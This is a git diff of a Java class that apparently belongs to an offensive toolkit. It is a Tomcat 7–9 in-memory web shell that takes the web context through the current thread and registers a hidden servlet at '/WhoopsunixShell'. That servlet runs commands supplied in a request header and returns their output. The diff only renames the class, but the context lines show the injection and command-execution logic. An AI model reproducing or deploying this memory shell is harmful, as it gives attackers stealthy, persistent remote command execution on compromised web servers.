@@ -16,7 +16,7 @@ import java.lang.reflect.Method;
  * Thread 获取上下文注入 Tomcat Servlet 型内存马
  * Tomcat 7 8 9
  */
-public class TSMSThread implements Servlet {
+public class TomcatServletThreadMS implements Servlet {
 
     final private static String NAME = "Whoopsunix";
     final private static String pattern = "/WhoopsunixShell";
@@ -24,7 +24,7 @@ public class TSMSThread implements Servlet {
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
-    public TSMSThread() {
+    public TomcatServletThreadMS() {
 
     }
 
@@ -80,7 +80,7 @@ public class TSMSThread implements Servlet {
             if (standardContext.findChild(NAME) == null) {
                 org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
                 wrapper.setName(NAME);
-                Servlet servlet = new TSMSThread();
+                Servlet servlet = new TomcatServletThreadMS();
                 wrapper.setServletClass(servlet.getClass().getName());
                 wrapper.setServlet(servlet);
                 // 添加到 standardContext
@@ -124,7 +124,7 @@ public class TSMSThread implements Servlet {
             }
             String result = exec(header);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TSMSThread injected");
+            printWriter.println("TomcatServletThreadMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
